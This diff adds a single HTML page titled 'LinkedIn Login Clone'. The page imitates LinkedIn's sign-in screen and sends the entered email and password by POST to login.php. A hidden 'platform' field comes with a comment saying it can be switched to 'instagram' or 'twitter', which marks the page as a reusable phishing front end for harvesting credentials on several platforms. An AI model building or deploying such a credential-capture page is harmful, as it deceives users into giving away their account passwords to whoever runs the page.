@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkedIn Login Clone</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="container">
+        <!-- LinkedIn Logo -->
+        <div class="logo">
+            <img src="linkedin-logo.png" alt="LinkedIn Logo">
+        </div>
+
+        <!-- Login Form -->
+        <div class="login-box">
+            <h2>Sign in</h2>
+            <p>Stay updated on your professional world</p>
+            
+           <form action="login.php" method="POST">
+             <input type="hidden" name="platform" value="linkdin"> <!-- Change to "instagram" or "twitter" as needed -->
+                <input type="text" name="username" placeholder="Email or phone" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <a href="#" class="forgot-password">Forgot password?</a>
+                <button type="submit" class="login-btn">Sign in</button>
+            </form>
+
+            <div class="or">or</div>
+
+            <button class="google-btn">Sign in with Google</button>
+
+            <p class="join-now">New to LinkedIn? <a href="#">Join now</a></p>
+        </div>
+    </div>
+
+</body>
+</html>
